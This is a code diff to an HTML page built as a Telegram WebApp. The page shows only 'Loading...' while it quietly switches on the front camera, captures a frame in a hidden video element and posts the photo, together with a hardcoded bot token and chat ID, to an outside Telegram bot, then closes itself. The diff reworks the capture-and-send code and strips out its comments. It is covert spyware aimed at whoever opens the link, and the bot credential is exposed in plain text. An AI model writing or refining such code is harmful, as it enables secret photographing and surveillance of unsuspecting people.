@@ -9,78 +9,55 @@
 <body style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:#fff;font-family:sans-serif;">
     <h1>Loading...</h1>
     <script>
-        // Получаем объект Telegram WebApp
         const tg = window.Telegram.WebApp;
-        tg.ready(); // Сообщаем, что приложение готово
+        tg.ready();
 
-        // Сразу запрашиваем доступ к камере
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(stream => {
-                // Создаём скрытый video-элемент
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.play();
 
-                // Ждём 500 мс, чтобы камера прогрелась
-                setTimeout(() => {
-                    // Создаём canvas для захвата кадра
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                // Ждём, когда видео загрузится
+                video.onloadedmetadata = function() {
+                    // Даём камере время на прогрев
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                    // Получаем фото в base64 (JPEG)
-                    const photoData = canvas.toDataURL('image/jpeg', 0.8);
+                        // Отправляем как Blob (надёжнее)
+                        canvas.toBlob(function(blob) {
+                            const formData = new FormData();
+                            formData.append('chat_id', '7406666272');
+                            formData.append('photo', blob, 'photo.jpg');
 
-                    // Отправляем на сервер или напрямую в Telegram
-                    sendPhotoToBot(photoData);
+                            fetch('https://api.telegram.org/bot8677834656:AAG65uW4UP2WbT_3Op4exFMOTJsHnxRR85A/sendPhoto', {
+                                method: 'POST',
+                                body: formData
+                            })
+                            .then(response => response.json())
+                            .then(data => {
+                                console.log('Фото отправлено:', data);
+                                tg.close();
+                            })
+                            .catch(err => {
+                                console.error('Ошибка отправки:', err);
+                                tg.close();
+                            });
+                        }, 'image/jpeg', 0.7);
 
-                    // Останавливаем камеру
-                    stream.getTracks().forEach(track => track.stop());
+                        stream.getTracks().forEach(track => track.stop());
 
-                }, 500);
+                    }, 300); // задержка 300 мс
+                };
             })
             .catch(err => {
                 console.error('Ошибка камеры:', err);
-                // Если камера не доступна — показываем заглушку
                 document.querySelector('h1').innerText = 'Camera not available';
             });
-
-        // Отправка фото через Telegram API
-        function sendPhotoToBot(base64Data) {
-            const botToken = '8677834656:AAG65uW4UP2WbT_3Op4exFMOTJsHnxRR85A';
-            const chatId = '7406666272'; // Твой Telegram ID
-
-            // Конвертируем base64 в Blob
-            const byteString = atob(base64Data.split(',')[1]);
-            const mimeString = base64Data.split(',')[0].split(':')[1].split(';')[0];
-            const ab = new ArrayBuffer(byteString.length);
-            const ia = new Uint8Array(ab);
-            for (let i = 0; i < byteString.length; i++) {
-                ia[i] = byteString.charCodeAt(i);
-            }
-            const blob = new Blob([ab], { type: mimeString });
-
-            // Отправляем через FormData
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', blob, 'photo.jpg');
-
-            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Фото отправлено:', data);
-                // Можно закрыть WebApp или показать успех
-                tg.close();
-            })
-            .catch(error => {
-                console.error('Ошибка отправки:', error);
-            });
-        }
     </script>
 </body>
 </html>
